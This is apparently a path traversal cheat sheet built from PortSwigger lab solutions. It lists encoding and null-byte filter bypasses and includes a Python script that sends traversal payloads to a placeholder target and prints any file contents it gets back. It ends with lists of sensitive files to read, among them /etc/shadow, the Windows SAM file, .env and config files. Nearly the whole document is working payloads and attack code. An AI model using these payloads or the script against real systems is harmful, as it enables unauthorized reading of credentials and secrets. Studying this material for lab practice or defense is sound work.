# Path Traversal - Advanced Bypass Techniques

## PortSwigger Lab Solutions

### Lab: Traversal sequences stripped non-recursively
**Bypass**: Double the traversal sequence
```
....//....//....//etc/passwd
```
After stripping `../`: `../../../etc/passwd`

### Lab: Traversal sequences stripped with URL encoding
**Bypass**: URL encode the dots
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
Or double URL encode:
```
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Lab: Null byte bypass
**Bypass**: Use null byte to terminate string before extension
```
../../../etc/passwd%00.png
```

### Lab: Start path validation bypass
**Bypass**: Use absolute path or trick validation
```
/var/www/images/../../../etc/passwd
```

## Encoding Bypasses

### URL Encoding
```
%2e%2e%2f → ../
%252e%252e%252f → ../ (double encoded)
```

### Unicode/UTF-8
```
..%c0%af → ../
..%c1%9c → ../
```

### Overlong UTF-8
```
%c0%ae%c0%ae/ → ../
```

### 16-bit Unicode
```
..%u2215 → ../
..%u2216 → ../
```

### HTML entities (for XML context)
```
&#46;&#46;&#47; → ../
```

## Path Variations

### Absolute paths
```
/etc/passwd
/var/www/html/config.php
```

### UNC paths (Windows)
```
\server\share\file
```

### Null byte variations
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
```

### Dot variations
```
..%00/
..%0d/
..%0a/
..%5c
..%ff/
```

## Detection Script
```python
import requests

traversals = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../etc/passwd%00.png",
    "/var/www/images/../../../etc/passwd",
]

target = "https://TARGET/image"
for t in traversals:
    r = requests.get(target, params={"filename": t})
    if "root:" in r.text:
        print(f"[!] VULNERABLE: {t}")
        print(r.text[:200])
```

## Common Files to Read

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/apache2/apache2.conf
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
```

### Windows
```
c:\windows\system32\drivers\etc\hosts
c:\windows\win.ini
c:\windows\system32\config\SAM
```

### Application
```
../../../web.config
../../../config.php
../../../.env
../../../database.yml
```
